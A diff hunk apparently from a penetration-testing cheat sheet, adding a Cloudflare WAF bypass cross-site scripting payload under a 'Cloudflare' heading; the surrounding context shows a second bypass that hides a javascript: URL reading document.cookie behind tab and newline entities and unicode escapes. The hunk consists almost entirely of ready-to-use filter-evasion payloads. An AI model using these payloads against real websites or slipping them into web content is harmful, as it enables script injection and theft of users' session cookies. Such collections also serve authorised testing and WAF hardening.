@@ -1875,6 +1875,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 ``` 
 
 ### Cloudflare
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+<a"/onclick=(confirm)()>ClickHere
+```
 - XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
